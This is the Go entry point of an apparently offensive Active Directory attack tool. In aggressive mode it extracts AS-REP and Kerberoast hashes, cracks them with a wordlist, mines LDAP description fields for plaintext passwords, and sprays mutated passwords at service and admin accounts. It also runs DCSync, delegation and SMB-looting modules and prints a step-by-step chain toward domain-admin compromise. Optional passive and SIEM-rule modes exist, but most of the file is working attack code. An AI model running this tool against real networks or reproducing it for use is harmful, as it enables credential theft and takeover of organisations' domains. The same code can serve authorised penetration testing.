package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/thechosenone-shall-prevail/cold-relay/pkg/advanced"
	"github.com/thechosenone-shall-prevail/cold-relay/pkg/attack"
	"github.com/thechosenone-shall-prevail/cold-relay/pkg/cracker"
	"github.com/thechosenone-shall-prevail/cold-relay/pkg/ingest"
	"github.com/thechosenone-shall-prevail/cold-relay/pkg/krb"
	"github.com/thechosenone-shall-prevail/cold-relay/pkg/output"
	"github.com/thechosenone-shall-prevail/cold-relay/pkg/reasoning"
	"github.com/thechosenone-shall-prevail/cold-relay/pkg/triage"
	"github.com/thechosenone-shall-prevail/cold-relay/pkg/util"
)

func connectWithFallback(base krb.ConnectOptions, fallback bool) (*krb.LDAPClient, error) {
	c, err := krb.Connect(base)
	if err == nil || !fallback || base.UseSSL || base.StartTLS {
		return c, err
	}
	log.Printf("[!] LDAP connect failed (%v); retrying with STARTTLS", err)
	b2 := base
	b2.StartTLS = true
	b2.UseSSL = false
	c2, e2 := krb.Connect(b2)
	if e2 == nil {
		return c2, nil
	}
	log.Printf("[!] STARTTLS failed (%v); retrying LDAPS", e2)
	b3 := base
	b3.StartTLS = false
	b3.UseSSL = true
	return krb.Connect(b3)
}

func main() {
	// Simplified flags
	target := flag.String("t", "", "Target IP or hostname")
	user := flag.String("u", "", "Username for authentication")
	pass := flag.String("p", "", "Password for authentication")
	domain := flag.String("d", "", "Domain name (auto-detected if omitted)")
	mode := flag.String("mode", "passive", "Scan mode: [passive] for enumeration only, [aggressive] for full attacks")
	outFile := flag.String("o", "results.json", "JSON output file")
	csvOut := flag.String("csv", "", "Optional CSV output file")
	jsonOnly := flag.Bool("json", false, "Output JSON to stdout only")

	// Legacy/advanced flags (still available for power users)
	ldaps := flag.Bool("ldaps", false, "Use LDAPS (port 636)")
	starttls := flag.Bool("starttls", false, "Use STARTTLS on LDAP port 389")
	insecure := flag.Bool("insecure", false, "Skip TLS certificate verification (insecure)")
	cafile := flag.String("cafile", "", "PEM CA bundle file for TLS verification")
	kdcHost := flag.String("kdc", "", "Explicit Kerberos KDC hostname or IP")
	fallbackTLS := flag.Bool("fallback-tls", false, "If plain LDAP fails, try STARTTLS then LDAPS")

	// Hidden power-user flags (not shown in help)
	crackWordlist := flag.String("w", "", "(Advanced) Path to wordlist for cracking")
	audit := flag.Bool("audit", false, "(Advanced) Run in audit mode")
	siem := flag.Bool("siem", false, "(Advanced) Generate SIEM detection rules")

	flag.Parse()

	// Positional target support
	if *target == "" && flag.NArg() > 0 {
		*target = flag.Arg(0)
	}

	if *target == "" {
		util.DisplayBanner("v5.1.0")
		flag.Usage()
		os.Exit(1)
	}

	util.DisplayBanner("v5.1.0")

	// Initial protocol discovery
	services := runProtocolDiscovery(*target)

	// Connection parameters
	bindUser := *user
	if *domain != "" && !strings.Contains(bindUser, "\\") && !strings.Contains(bindUser, "@") {
		bindUser = fmt.Sprintf("%s\\%s", *domain, *user)
	}

	connOpts := krb.ConnectOptions{
		Target:   *target,
		BindUser: bindUser,
		BindPass: *pass,
		UseSSL:   *ldaps,
		StartTLS: *starttls,
		Insecure: *insecure,
		CAFile:   *cafile,
		KDC:      *kdcHost,
		Timeout:  10 * time.Second,
	}

	log.Printf("[*] Auto-detecting connection to %s …", *target)

	client, err := connectWithFallback(connOpts, *fallbackTLS)
	if err != nil {
		// Try anonymous binding if credentials were provided but failed
		if *user == "" && *pass == "" {
			log.Printf("[*] No credentials provided, attempting anonymous bind...")
			connOpts.BindUser = ""
			connOpts.BindPass = ""
			client, err = connectWithFallback(connOpts, *fallbackTLS)
		}

		if err != nil {
			connOpts.BindUser = *user
			client, err = connectWithFallback(connOpts, *fallbackTLS)
			if err != nil {
				log.Fatalf("[x] Connection failed: %v", err)
			}
		}
	}
	defer client.Close()

	// Auto-detect domain from RootDSE if not provided
	if *domain == "" {
		log.Printf("[*] Auto-detecting domain from RootDSE...")
		domainInfo, err := client.GetDomainInfo()
		if err == nil && domainInfo.DomainName != "" {
			*domain = domainInfo.DomainName
			log.Printf("[+] Auto-detected domain: %s", *domain)
		}
	}

	// ── basic recon ───────────────────────────────────────────────────────
	users, err := client.EnumerateUsers()
	if err != nil {
		log.Fatalf("[x] User enumeration failed: %v", err)
	}
	log.Printf("%s[+] Found %d user objects%s", util.Green, len(users), util.Reset)
	log.Printf("%s[*] [ENTRY POINT] Current User: %s (Context: %s)%s", util.Cyan, bindUser, *target, util.Reset)

	domainInfo, _ := client.GetDomainInfo()
	cfg := triage.DefaultConfig()

	// ── kerberos analysis ─────────────────────────────────────────────────
	asrep := krb.FindASREPCandidates(users)
	kerb := krb.FindKerberoastCandidates(users)
	all := triage.ScoreCandidates(asrep, kerb, cfg)

	log.Printf("%s[+] %d AS-REP roastable  |  %d Kerberoastable%s", util.Green, len(asrep), len(kerb), util.Reset)

	// ── recon insights ──────────────────────────────────────────────────
	groupSet := make(map[string]bool)
	highRisk := 0
	for _, u := range users {
		for _, g := range u.MemberOf {
			groupSet[g] = true
			if strings.Contains(strings.ToLower(g), "admin") || strings.Contains(strings.ToLower(g), "domain controllers") {
				highRisk++
			}
		}
	}

	results := output.Results{
		SchemaVersion: "2.0",
		Domain: output.DomainInfo{
			Name:            domainInfo.DomainName,
			DN:              domainInfo.BaseDN,
			FunctionalLevel: domainInfo.FunctionalLevel,
			OS:              domainInfo.OS,
		},
		Summary: output.Summary{
			TotalUsers:           len(users),
			ASREPCandidates:      len(asrep),
			KerberoastCandidates: len(kerb),
			TotalGroups:          len(groupSet),
			HighRiskObjects:      highRisk,
		},
		Candidates: all,
		Users:      users,
	}

	// ── Determine mode-based behavior ─────────────────────────────────────
	isAggressive := strings.ToLower(*mode) == "aggressive"
	isPassive := strings.ToLower(*mode) == "passive"

	if !isAggressive && !isPassive {
		log.Fatalf("[x] Invalid mode: %s. Use 'passive' or 'aggressive'", *mode)
	}

	if isPassive {
		log.Printf("%s[*] PASSIVE MODE: Enumeration only (no attacks)%s", util.Cyan, util.Reset)
	} else {
		log.Printf("%s[*] AGGRESSIVE MODE: Full attack surface enabled%s", util.Yellow, util.Reset)
	}

	// ── hash extraction & cracking ───────────────────────────────────────
	if isAggressive && *crackWordlist != "" {
		log.Printf("[*] Hash cracking enabled with wordlist: %s", *crackWordlist)
		extractAndCrack(results.Candidates, *crackWordlist, client)
	}

	// ── real Kerberos protocol ───────────────────────────────────────────
	if isAggressive {
		results.Candidates = runRealKerberos(client, effectiveDomain(domainInfo, *domain), results.Candidates)
	}

	// ── advanced modules ─────────────────────────────────────────────────
	advResults := make(map[string]interface{})
	if isAggressive {
		advResults = runAdvanced(client, cfg, true, *audit, false, false, false, false, *target, bindUser, *pass, *domain)

		results.Advanced = output.AdvancedResults{}
		if val, ok := advResults["shares"]; ok {
			results.Advanced.Shares = val.([]string)
		}
		if val, ok := advResults["pwned"]; ok {
			results.Advanced.Pwned = val.(bool)
		}
		if val, ok := advResults["sensitive_files"]; ok {
			results.Advanced.SensitiveFiles = val.([]advanced.FileFinding)
		}
		if val, ok := advResults["gpp"]; ok {
			results.Advanced.GPPHashes = val
		}
		if val, ok := advResults["dcsync"]; ok {
			results.Advanced.DCSync = val
		}
		if val, ok := advResults["delegation"]; ok {
			results.Advanced.Delegation = val
		}
		if val, ok := advResults["rbcd"]; ok {
			results.Advanced.RBCD = val
		}
		if val, ok := advResults["pkinit"]; ok {
			results.Advanced.PKINIT = val
		}
		if val, ok := advResults["trusts"]; ok {
			results.Advanced.Trusts = val
		}
		if val, ok := advResults["dns_transfers"]; ok {
			results.Advanced.DNSTransfers = val
		}
		if val, ok := advResults["laps"]; ok {
			results.Advanced.LAPS = val
		}
		if val, ok := advResults["gpos"]; ok {
			results.Advanced.GPOs = val
		}
		if val, ok := advResults["sessions"]; ok {
			results.Advanced.Sessions = val
		}
		if val, ok := advResults["acl_analysis"]; ok {
			results.Advanced.ACLAnalysis = val
		}
	}

	// ── predator context engine ──────────────────────────────────────────
	riskInsights, newCandidates := generateRiskInsights(users, advResults)
	results.RiskInsights = riskInsights
	results.Candidates = append(results.Candidates, newCandidates...)
	results.Candidates = reasoning.AnnotateCandidates(results.Candidates)
	graph := reasoning.BuildGraph(reasoning.BuildContext{
		Target:      *target,
		Domain:      *domain,
		CurrentUser: bindUser,
		Mode:        *mode,
		Services:    services,
	}, users, results.Candidates, advResults)
	results.AttackGraph = &graph

	// Update summary with insights
	results.Summary.ASREPCandidates = 0
	results.Summary.KerberoastCandidates = 0
	results.Summary.ReconCandidates = 0
	results.Summary.HVTCandidates = 0
	results.Summary.LootCandidates = 0
	results.Summary.ValidationStatus = make(map[string]int)
	for _, c := range results.Candidates {
		switch c.Type {
		case "ASREP":
			results.Summary.ASREPCandidates++
		case "KERBEROAST":
			results.Summary.KerberoastCandidates++
		case "RECON":
			results.Summary.ReconCandidates++
		case "HVT":
			results.Summary.HVTCandidates++
		case "LOOT":
			results.Summary.LootCandidates++
		}
		if c.Validation != "" {
			results.Summary.ValidationStatus[c.Validation]++
		}
	}
	results.Summary.HighRiskObjects = results.Summary.ASREPCandidates + results.Summary.KerberoastCandidates + results.Summary.ReconCandidates + results.Summary.HVTCandidates + results.Summary.LootCandidates

	if len(results.RiskInsights) > 0 {
		log.Printf("%s[!] Attack Path Insights Detected:%s", util.Red, util.Reset)
		for _, insight := range results.RiskInsights {
			color := util.Yellow
			if strings.Contains(insight, "[CRITICAL]") || strings.Contains(insight, "[HIGH]") {
				color = util.Red
			} else if strings.HasPrefix(insight, "---") || strings.HasPrefix(insight, "→") || strings.HasPrefix(insight, "Step") {
				color = util.Cyan
			}
			log.Printf("    %s%s%s", color, insight, util.Reset)
		}
	}

	// ── loot reporting & offensive spray ─────────────────────────────────
	var allFoundPasswords []string
	if results.Advanced.SensitiveFiles != nil {
		foundLoot := false
		for _, f := range results.Advanced.SensitiveFiles {
			if len(f.LootFound) > 0 {
				if !foundLoot {
					log.Printf("%s[+] LOOT RECOVERY PHASE:%s", util.Green, util.Reset)
					foundLoot = true
				}
				for _, l := range f.LootFound {
					log.Printf("    %s%s%s → %s", util.Green, f.Path, util.Reset, l)
					// Extract the password part for spraying
					parts := strings.Split(l, ": ")
					if len(parts) > 1 {
						allFoundPasswords = append(allFoundPasswords, parts[1])
					}
				}
			}
		}
	}

	// Add passwords found in LDAP attributes
	for _, c := range results.Candidates {
		if c.Type == "LOOT" {
			for _, r := range c.Reasons {
				if strings.Contains(r, "LDAP") {
					parts := strings.Split(r, ": ")
					if len(parts) > 1 {
						allFoundPasswords = append(allFoundPasswords, parts[1])
					}
				}
			}
		}
	}

	if len(allFoundPasswords) > 0 {
		log.Printf("%s[*] Starting Offensive Credential Spray & Mutation...%s", util.Cyan, util.Reset)
		for _, rawPass := range allFoundPasswords {
			variants := attack.MutatePassword(rawPass)
			for _, v := range variants {
				// Test against discovered users
				for _, u := range users {
					// To avoid excessive noise, we only test against users with high scores or service accounts
					if u.SamAccountName != "" && (strings.HasPrefix(u.SamAccountName, "svc") || strings.Contains(u.SamAccountName, "admin")) {
						results := attack.SprayTest(*target, u.SamAccountName, v, *domain)
						if len(results) > 0 {
							for svc := range results {
								if svc == "ldap_bind_ok" { // Confirmed valid bind
									attack.ReportSuccess(u.SamAccountName, v, svc)
								}
							}
						}
					}
				}
			}
		}
	}

	// ── output ───────────────────────────────────────────────────────────
	writeResults(results, all, cfg, *outFile, *csvOut, *siem, *jsonOnly)

	log.Printf("%s[+] Results → %s%s", util.Green, *outFile, util.Reset)
	log.Printf("%s[+] Done: %d candidates (%d Kerberos / %d Recon / %d HVT)%s",
		util.Green,
		results.Summary.HighRiskObjects,
		results.Summary.ASREPCandidates+results.Summary.KerberoastCandidates,
		results.Summary.ReconCandidates,
		results.Summary.HVTCandidates,
		util.Reset)
}

func runAdvanced(client *krb.LDAPClient, cfg *triage.Config, all, audit, rbcd, s4u, dcsync, pkinit bool, target, user, pass, domain string) map[string]interface{} {
	log.Printf("[*] Running advanced analysis …")
	analyzer := advanced.NewAdvancedAnalyzer(client, audit, false, target, user, pass, domain)

	if all {
		analyzer.RunFullAnalysis()
	} else {
		if rbcd {
			analyzer.RunRBCDAnalysis()
		}
		if s4u {
			analyzer.RunS4UAnalysis()
		}
		if dcsync {
			analyzer.RunDCSyncAnalysis()
		}
		if pkinit {
			analyzer.RunPKINITAnalysis()
		}
	}

	log.Printf("%s[+] Full advanced analysis completed%s", util.Green, util.Reset)
	return analyzer.Results
}

func writeResults(results output.Results, candidates []krb.Candidate, cfg *triage.Config, outFile, csvOut string, siem, jsonOnly bool) {
	if jsonOnly {
		data, _ := json.MarshalIndent(results, "", "  ")
		fmt.Println(string(data))
		return
	}

	if err := output.WriteJSON(outFile, results); err != nil {
		log.Printf("[x] Failed to write JSON output: %v", err)
	}

	if csvOut != "" {
		if err := output.WriteCSV(csvOut, results); err != nil {
			log.Printf("[x] Failed to write CSV output: %v", err)
		}
	}

	if siem {
		siemPath := "siem_rules.yaml"
		if err := output.WriteSigmaRules(siemPath, results); err != nil {
			log.Printf("[x] Failed to write SIEM rules: %v", err)
		}
		log.Printf("%s[+] SIEM detection rules exported to %s%s", util.Green, siemPath, util.Reset)
	}
}

func extractAndCrack(candidates []krb.Candidate, wordlist string, client *krb.LDAPClient) {
	log.Printf("[*] Extracting and cracking hashes...")
	di, _ := client.GetDomainInfo()
	domain := di.DomainName
	if domain == "" {
		return
	}
	dir, err := os.MkdirTemp("", "COLD-RELAY-*")
	if err != nil {
		log.Printf("[x] temp dir: %v", err)
		return
	}
	defer os.RemoveAll(dir)

	asrepPath := filepath.Join(dir, "asrep.txt")
	kerbPath := filepath.Join(dir, "kerberoast.txt")
	var asrepLines, kerbLines []string

	for _, c := range candidates {
		switch c.Type {
		case "ASREP":
			hr, err := client.ExtractASREPHash(c.SamAccountName, domain)
			if err != nil {
				log.Printf("[!] AS-REP %s: %v", c.SamAccountName, err)
				continue
			}
			asrepLines = append(asrepLines, hr.Hash)
		case "KERBEROAST":
			for _, spn := range c.SPNs {
				hr, err := client.ExtractKerberoastHash(c.SamAccountName, domain, spn)
				if err != nil {
					log.Printf("[!] Kerberoast %s %s: %v", c.SamAccountName, spn, err)
					continue
				}
				kerbLines = append(kerbLines, hr.Hash)
			}
		}
		time.Sleep(120 * time.Millisecond)
	}

	if len(asrepLines) > 0 {
		var b strings.Builder
		for _, line := range asrepLines {
			b.WriteString(line)
			b.WriteByte(10)
		}
		_ = os.WriteFile(asrepPath, []byte(b.String()), 0600)
		if wordlist != "" {
			if _, err := cracker.CrackHashes(asrepPath, wordlist, "asrep"); err != nil {
				log.Printf("[x] AS-REP crack: %v", err)
			}
		}
	}
	if len(kerbLines) > 0 {
		var kb strings.Builder
		for _, line := range kerbLines {
			kb.WriteString(line)
			kb.WriteByte(10)
		}
		_ = os.WriteFile(kerbPath, []byte(kb.String()), 0600)
		if wordlist != "" {
			if _, err := cracker.CrackHashes(kerbPath, wordlist, "kerberoast"); err != nil {
				log.Printf("[x] Kerberoast crack: %v", err)
			}
		}
	}
}

func runRealKerberos(client *krb.LDAPClient, domain string, candidates []krb.Candidate) []krb.Candidate {
	log.Printf("[*] Running real Kerberos interactions (extract hashes to candidates)...")
	if domain == "" {
		return candidates
	}
	for i := range candidates {
		switch candidates[i].Type {
		case "ASREP":
			hr, err := client.ExtractASREPHash(candidates[i].SamAccountName, domain)
			if err != nil {
				log.Printf("[!] AS-REP %s: %v", candidates[i].SamAccountName, err)
				continue
			}
			candidates[i].Hash = hr.Hash
		case "KERBEROAST":
			for _, spn := range candidates[i].SPNs {
				hr, err := client.ExtractKerberoastHash(candidates[i].SamAccountName, domain, spn)
				if err != nil {
					log.Printf("[!] Kerberoast %s: %v", candidates[i].SamAccountName, err)
					continue
				}
				candidates[i].Hash = hr.Hash
				break
			}
		}
		time.Sleep(120 * time.Millisecond)
	}
	return candidates
}

func effectiveDomain(di *krb.DomainInfo, flagDomain string) string {
	if flagDomain != "" {
		return strings.ToUpper(flagDomain)
	}
	if di != nil && di.DomainName != "" {
		return di.DomainName
	}
	return ""
}

func generateRiskInsights(users []ingest.User, advResults map[string]interface{}) ([]string, []krb.Candidate) {
	var insights []string
	var candidates []krb.Candidate

	// Check for High Value Targets (Admins)
	for _, u := range users {
		isAdmin := false
		for _, g := range u.MemberOf {
			lowerG := strings.ToLower(g)
			if strings.Contains(lowerG, "domain admins") || strings.Contains(lowerG, "enterprise admins") || strings.Contains(lowerG, "administrators") {
				isAdmin = true
				break
			}
		}

		if isAdmin {
			insights = append(insights, fmt.Sprintf("[CRITICAL] High Value Target: %s (Admin Privileges Detected)", u.SamAccountName))
			candidates = append(candidates, krb.Candidate{
				SamAccountName: u.SamAccountName,
				Type:           "HVT",
				Score:          90,
				Reasons:        []string{"High Value Target: Domain/Enterprise Admin"},
			})
		}

		// --- DEEP LDAP ATTRIBUTE MINING ---
		lootAttributes := map[string]string{
			"Description": u.Description,
			"Info":        u.Info,
			"Comment":     u.Comment,
			"Office":      u.PhysicalDeliveryOfficeName,
			"Notes":       u.PostOfficeBox,
		}

		patterns := []string{"password", "pass:", "pwd=", "secret", "creds", "token"}

		for attrName, attrValue := range lootAttributes {
			lowerValue := strings.ToLower(attrValue)
			for _, p := range patterns {
				if strings.Contains(lowerValue, p) {
					insights = append(insights, fmt.Sprintf("[CRITICAL] LOOT FOUND in LDAP %s of %s (Found keyword: '%s')", attrName, u.SamAccountName, p))
					candidates = append(candidates, krb.Candidate{
						SamAccountName: u.SamAccountName,
						Type:           "LOOT",
						Score:          100,
						Reasons:        []string{fmt.Sprintf("Plaintext secret found in LDAP %s: %s", attrName, attrValue)},
					})
					break
				}
			}
		}

		// Service Accounts
		if strings.HasPrefix(strings.ToLower(u.SamAccountName), "svc_") || (strings.Contains(strings.ToLower(u.Description), "service") && !strings.Contains(strings.ToLower(u.Description), "account")) {
			insights = append(insights, fmt.Sprintf("[INFO] Service account detected: %s (Check for weak/reused passwords)", u.SamAccountName))
		}

		// Inactive users with potentially stale passwords (prefer lastLogonTimestamp)
		lastSeen := u.LastLogonTimestamp
		if lastSeen.IsZero() {
			lastSeen = u.LastLogon
		}
		if lastSeen.IsZero() && !u.PwdLastSet.IsZero() && !strings.Contains(strings.ToLower(u.SamAccountName), "guest") {
			insights = append(insights, fmt.Sprintf("[MEDIUM] Inactive user with set password: %s (Potential stale credentials)", u.SamAccountName))
		}
	}

	// Check SMB findings
	if val, ok := advResults["sensitive_files"]; ok {
		files := val.([]advanced.FileFinding)
		if len(files) > 0 {
			sharesFound := make(map[string]int)
			hasLoot := false
			for _, f := range files {
				sharesFound[f.Share]++
				if len(f.LootFound) > 0 {
					hasLoot = true
				}
			}
			for s, count := range sharesFound {
				prefix := "[HIGH]"
				score := 85
				if hasLoot {
					prefix = "[CRITICAL]"
					score = 100
				}
				insights = append(insights, fmt.Sprintf("%s READ access to juicy share: %s (Found %d sensitive files)", prefix, s, count))
				candidates = append(candidates, krb.Candidate{
					SamAccountName: s,
					Type:           "RECON",
					Score:          score,
					Reasons:        []string{fmt.Sprintf("Readable juicy share: %s with %d sensitive files", s, count)},
				})
			}
		}
	}

	if val, ok := advResults["pwned"]; ok {
		if pwned := val.(bool); pwned {
			insights = append(insights, "[CRITICAL] SMB PWNED! Administrative access confirmed via ADMIN$ or C$.")
		}
	}

	// ── strategic roadmap ──────────────────────────────────────────────
	if len(insights) > 0 {
		insights = append(insights, "--- Tactical Attack Chain ---")
		step := 1

		// Step 1: Recon/Credentials
		if strings.Contains(strings.Join(insights, ""), "juicy share") {
			insights = append(insights, fmt.Sprintf("Step %d: Enumerate sensitive shares (Logs/Backup) to harvest plaintext credentials.", step))
			step++
		} else if strings.Contains(strings.Join(insights, ""), "Description") {
			insights = append(insights, fmt.Sprintf("Step %d: Extract credentials from LDAP 'Description' fields.", step))
			step++
		}

		// Step 2: Escalation
		if val, ok := advResults["pwned"]; ok && val.(bool) {
			insights = append(insights, fmt.Sprintf("Step %d: Leverage LOCAL ADMIN access to dump SAM/LSA secrets or pivot.", step))
			step++
		} else {
			insights = append(insights, fmt.Sprintf("Step %d: Use harvested credentials to test against SMB, WinRM, and RDP.", step))
			step++
		}

		// Step 3: Domain Compromise
		if strings.Contains(strings.Join(insights, ""), "High Value Target") {
			insights = append(insights, fmt.Sprintf("Step %d: Target identified Domain Admins for full domain compromise.", step))
			step++
		}
	}

	return insights, candidates
}

func runProtocolDiscovery(target string) []string {
	log.Printf("[*] Discovering active services on %s...", target)

	ports := map[int]string{
		88:   "Kerberos",
		135:  "RPC",
		389:  "LDAP",
		445:  "SMB",
		464:  "kpasswd",
		636:  "LDAPS",
		3268: "GC",
		3269: "GC_SSL",
		3389: "RDP",
		5985: "WinRM",
		5986: "WinRM_SSL",
		9389: "ADWS",
	}

	var hits []string
	for port, name := range ports {
		address := net.JoinHostPort(target, fmt.Sprintf("%d", port))
		conn, err := net.DialTimeout("tcp", address, 1*time.Second)
		if err == nil {
			hits = append(hits, fmt.Sprintf("%s:%d", name, port))
			conn.Close()
		}
	}

	if len(hits) > 0 {
		log.Printf("%s[+] Services detected: %s%s", util.Green, strings.Join(hits, " | "), util.Reset)
	}
	return hits
}
